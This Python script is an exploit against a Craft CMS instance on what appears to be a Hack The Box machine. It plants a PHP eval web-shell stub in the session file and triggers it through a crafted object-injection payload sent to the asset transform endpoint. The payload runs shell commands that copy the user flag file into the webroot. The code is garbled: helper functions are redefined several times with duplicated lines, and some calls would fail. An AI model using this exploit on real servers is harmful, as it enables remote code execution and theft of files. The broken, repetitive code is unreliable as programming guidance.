#!/usr/bin/env python3
import http.client, re, urllib.parse, json, time, random, sys

host = '10.129.54.140'
port = 80

def http_get(path, cookie=None):
    c = http.client.HTTPConnection('10.129.54.140', 80, timeout=15)
    h = {'Host': 'orion.htb'}
    if cookie: h['Cookie'] = cookie
    c.request('GET', path, headers=h)
    r = c.getresponse()
    body = r.read().decode('utf-8', errors='replace')
    c.close()
    return r.status, body, r.getheader('Set-Cookie')

def http_post(path, body, cookie, csrf):
    c = http.client.HTTPConnection('10.129.54.140', 80, timeout=30)
    h = {'Host': 'orion.htb', 'Content-Type': 'application/json', 'X-CSRF-Token': csrf, 'Cookie': cookie, 'Content-Length': str(len(body))}
    c.request('POST', path, body=body.encode(), headers=h)
    r = c.getresponse()
    body = r.read().decode('utf-8', errors='replace')
    c.close()
    return r.status, body

def get_session_csrf():
    c = http.client.HTTPConnection('10.129.54.140', 80, timeout=15)
    c.request('GET', '/index.php?p=admin/login', headers={'Host': 'orion.htb'})
    r = c.getresponse()
    body = r.read().decode('utf-8', errors='replace')
    m = re.search(r'csrfTokenValue":"([^"]+)"', body)
    csrf = m.group(1) if m else None
    sc = r.getheader('Set-Cookie')
    session = re.search(r'CraftSessionId=([^;]+)', sc).group(1) if sc else None
    return session, csrf

def inject_stub(session):
    path = '/index.php?p=admin/dashboard&x12345=' + urllib.parse.quote("<?=eval($_GET['x12345']);die()?>")
    http_get(path, 'CraftSessionId=' + session)

def get_csrf(session):
    status, body, _ = http_get('/index.php?p=admin/login', 'CraftSessionId=' + session)
    m = re.search(r'csrfTokenValue":"([^"]+)"', body)
    return m.group(1) if m else None

def http_post(path, body, cookie, csrf):
    c = http.client.HTTPConnection('10.129.54.140', 80, timeout=30)
    h = {'Host': 'orion.htb', 'Content-Type': 'application/json', 'X-CSRF-Token': csrf, 'Cookie': cookie, 'Content-Length': str(len(body))}
    c = http.client.HTTPConnection('10.129.54.140', 80, timeout=30)
    h = {'Host': 'orion.htb', 'Content-Type': 'application/json', 'X-CSRF-Token': csrf, 'Cookie': cookie, 'Content-Length': str(len(body))}
    c = http.client.HTTPConnection('10.129.54.140', 80, timeout=30)
    h = {'Host': 'orion.htb', 'Content-Type': 'application/json', 'X-CSRF-Token': csrf, 'Cookie': cookie, 'Content-Length': str(len(body))}
    conn = http.client.HTTPConnection('10.129.54.140', 80, timeout=30)
    conn.request('POST', '/index.php?p=actions/assets/generate-transform&x' + urllib.parse.quote('file_put_contents("/var/www/html/craft/web/flag.txt", shell_exec("cat /home/adam/user.txt 2>&1"));'), body=json.dumps({'assetId': 11, 'handle': {'width': 123, 'height': 456, 'as session': {'class': 'craft\\behaviors\\FieldLayoutBehavior', '__class': 'yii\\rbac\\PhpManager', 'itemFile': '/var/lib/php/sessions/sess_' + session}}}).encode(), headers={'Host': 'orion.htb', 'Content-Type': 'application/json', 'X-CSRF-Token': csrf, 'Cookie': 'CraftSessionId=' + session, 'Content-Length': str(len(json.dumps({'assetId': 11, 'handle': {'width': 123, 'height': 456, 'as session': {'class': 'craft\\behaviors\\FieldLayoutBehavior', '__class': 'yii\\rbac\\PhpManager', 'itemFile': '/var/lib/php/sessions/sess_' + session}})))})
    r = c.getresponse()
    body = r.read().decode('utf-8', errors='replace')
    return r.status, body

def http_get(path, cookie=None):
    c = http.client.HTTPConnection('10.129.54.140', 80, timeout=15)
    h = {'Host': 'orion.htb'}
    if cookie: h['Cookie'] = cookie
    c.request('GET', path, headers=h)
    r = c.getresponse()
    body = r.read().decode('utf-8', errors='replace')
    c.close()
    return r.status, body, r.getheader('Set-Cookie')

def http_post(path, body, cookie, csrf):
    c = http.client.HTTPConnection('10.129.54.140', 80, timeout=30)
    h = {'Host': 'orion.htb', 'Content-Type': 'application/json', 'X-CSRF-Token': csrf, 'Cookie': cookie, 'Content-Length': str(len(body))}
    conn = http.client.HTTPConnection('10.129.54.140', 80, timeout=30)
    conn.request('POST', path, body=body.encode(), headers={'Host': 'orion.htb', 'Content-Type': 'application/json', 'X-CSRF-Token': csrf, 'Cookie': cookie, 'Content-Length': str(len(body))})
    r = conn.getresponse()
    body = r.read().decode('utf-8', errors='replace')
    return r.status, r.read().decode('utf-8', errors='replace')

def http_get(path, cookie=None):
    c = http.client.HTTPConnection('10.129.54.140', 80, timeout=15)
    h = {'Host': 'orion.htb'}
    if cookie: h['Cookie'] = cookie
    c.request('GET', path, headers=h)
    r = c.getresponse()
    body = r.read().decode('utf-8', errors='replace')
    c.close()
    return r.status, body, r.getheader('Set-Cookie')

def http_post(path, body, cookie, csrf):
    conn = http.client.HTTPConnection('10.129.54.140', 80, timeout=30)
    conn.request('POST', path, body=body.encode(), headers={'Host': 'orion.htb', 'Content-Type': 'application/json', 'X-CSRF-Token': csrf, 'Cookie': cookie, 'Content-Length': str(len(body))})
    r = conn.getresponse()
    body = r.read().decode('utf-8', errors='replace')
    return r.status, r.read().decode('utf-8', errors='replace')

def get_session_csrf():
    c = http.client.HTTPConnection('10.129.54.140', 80, timeout=15)
    c.request('GET', '/index.php?p=admin/login', headers={'Host': 'orion.htb'})
    r = c.getresponse()
    body = r.read().decode('utf-8', errors='replace')
    m = re.search(r'csrfTokenValue":"([^"]+)"', body)
    csrf = m.group(1) if m else None
    sc = r.getheader('Set-Cookie')
    session = re.search(r'CraftSessionId=([^;]+)', sc).group(1) if sc else None
    return session, csrf

def inject_stub(session):
    import urllib.parse
    path = '/index.php?p=admin/dashboard&x12345=' + urllib.parse.quote("<?=eval($_GET['x12345']);die()?>")
    c = http.client.HTTPConnection('10.129.54.140', 80, timeout=15)
    c.request('GET', '/index.php?p=admin/dashboard&x12345=' + urllib.parse.quote("<?=eval($_GET['x12345']);die()?>"), headers={'Host': 'orion.htb', 'Cookie': 'CraftSessionId=' + session})
    c.getresponse().read()
    time.sleep(1)

def get_csrf(session):
    c = http.client.HTTPConnection('10.129.54.140', 80, timeout=15)
    c.request('GET', '/index.php?p=admin/login', headers={'Host': 'orion.htb', 'Cookie': 'CraftSessionId=' + session})
    r = c.getresponse()
    body = r.read().decode('utf-8', errors='replace')
    m = re.search(r'csrfTokenValue":"([^"]+)"', body)
    return m.group(1) if m else None

def http_post(path, body, cookie, csrf):
    conn = http.client.HTTPConnection('10.129.54.140', 80, timeout=30)
    conn.request('POST', path, body=body.encode(), headers={'Host': 'orion.htb', 'Content-Type': 'application/json', 'X-CSRF-Token': csrf, 'Cookie': 'CraftSessionId=' + session, 'Content-Length': str(len(body))})
    r = conn.getresponse()
    body = r.read().decode('utf-8', errors='replace')
    return r.status, r.read().decode('utf-8', errors='replace')

def http_get(path, cookie=None):
    c = http.client.HTTPConnection('10.129.54.140', 80, timeout=15)
    c.request('GET', path, headers={'Host': 'orion.htb', 'Cookie': cookie} if cookie else {'Host': 'orion.htb'})
    r = c.getresponse()
    body = r.read().decode('utf-8', errors='replace')
    c.close()
    return r.status, body, r.getheader('Set-Cookie')

# Main
print('[*] Getting session...')
c = http.client.HTTPConnection('10.129.54.140', 80, timeout=15)
c.request('GET', '/index.php?p=admin/login', headers={'Host': 'orion.htb'})
r = c.getresponse()
body = c.read().decode('utf-8', errors='replace')
m = re.search(r'csrfTokenValue":"([^"]+)"', body)
csrf = re.search(r'csrfTokenValue":"([^"]+)"', body).group(1) if re.search(r'csrfTokenValue":"([^"]+)"', body) else None
sc = r.getheader('Set-Cookie')
session = re.search(r'CraftSessionId=([^;]+)', sc).group(1) if sc else None
print('Session:', session)
if not session:
    sys.exit(1)

print('[*] Injecting stub...')
import urllib.parse, time
path = '/index.php?p=admin/dashboard&x12345=' + urllib.parse.quote("<?=eval($_GET['x12345']);die()?>")
c = http.client.HTTPConnection('10.129.54.140', 80, timeout=15)
c.request('GET', '/index.php?p=admin/dashboard&x12345=' + urllib.parse.quote("<?=eval($_GET['x12345']);die()?>"), headers={'Host': 'orion.htb', 'Cookie': 'CraftSessionId=' + session})
c.getresponse().read()
time.sleep(1)

c = http.client.HTTPConnection('10.129.54.140', 80, timeout=15)
c.request('GET', '/index.php?p=admin/login', headers={'Host': 'orion.htb', 'Cookie': 'CraftSessionId=' + session})
r = c.getresponse()
body = r.read().decode('utf-8', errors='replace')
m = re.search(r'csrfTokenValue":"([^"]+)"', body)
csrf = m.group(1) if m else None
print('CSRF:', csrf[:20] + '...' if csrf else 'NONE')

print('[*] Writing user.txt to webroot...')
body_json = json.dumps({'assetId': 11, 'handle': {'width': 123, 'height': 456, 'as session': {'class': 'craft\\behaviors\\FieldLayoutBehavior', '__class': 'yii\\rbac\\PhpManager', 'itemFile': '/var/lib/php/sessions/sess_' + session}}})
c = http.client.HTTPConnection('10.129.54.140', 80, timeout=30)
c.request('POST', '/index.php?p=actions/assets/generate-transform&x' + urllib.parse.quote('file_put_contents("/var/www/html/craft/web/flag.txt", shell_exec("cat /home/adam/user.txt 2>&1"));'), body=json.dumps({'assetId': 11, 'handle': {'width': 123, 'height': 456, 'as session': {'class': 'craft\\behaviors\\FieldLayoutBehavior', '__class': 'yii\\rbac\\PhpManager', 'itemFile': '/var/lib/php/sessions/sess_' + session}}}).encode(), headers={'Host': 'orion.htb', 'Content-Type': 'application/json', 'X-CSRF-Token': csrf, 'Cookie': 'CraftSessionId=' + session, 'Content-Length': str(len(json.dumps({'assetId': 11, 'handle': {'width': 123, 'height': 456, 'as session': {'class': 'craft\\behaviors\\FieldLayoutBehavior', '__class': 'yii\\rbac\\PhpManager', 'itemFile': '/var/lib/php/sessions/sess_' + session}})))})
r = c.getresponse()
body = c.getresponse().read().decode('utf-8', errors='replace')
print('Write user status:', r.status)
c.close()

time.sleep(1)

# Fetch flag file
import http.client
c = http.client.HTTPConnection('10.129.54.140', 80, timeout=15)
c.request('GET', '/flag.txt', headers={'Host': 'orion.htb'})
r = c.getresponse()
body = c.getresponse().read().decode('utf-8', errors='replace')
print('Flag file status:', r.status)
if 'HTB{' in body:
    m = re.search(r'HTB\{[^}]+\}', body)
    if m:
        print('[+] USER FLAG:', m.group(0))
    else:
        print('No flag match in body')
else:
    print('No flag in response:', body[:500])